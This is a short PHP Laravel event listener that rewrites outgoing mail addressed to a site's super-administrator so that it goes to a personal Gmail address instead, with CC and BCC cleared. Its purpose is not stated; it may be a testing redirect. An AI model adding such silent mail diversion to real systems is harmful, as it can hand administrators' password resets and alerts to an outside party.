<?php

namespace App\Listeners;

use Illuminate\Mail\Events\MessageSending;
use Symfony\Component\Mime\Address;

class RedirectSuperAdminMail
{
    public function handle(MessageSending $event)
    {
        $message = $event->message;

        // For Symfony\Component\Mime\Email (Laravel 9+ default)
        if ($message instanceof \Symfony\Component\Mime\Email) {
            $toAddresses = $message->getTo();

            if ($toAddresses) {
                foreach ($toAddresses as $address) {
                    if (strtolower($address->getAddress()) === 'superadmin@degeest.com') {
                        // Replace To with redirect address
                        $message->to(new Address('ashasodani11@gmail.com', 'Redirected Superadmin'));

                        // Optional: Remove from CC and BCC
                        $message->cc([]);
                        $message->bcc([]);
                        break;
                    }
                }
            }
        }
    }
}
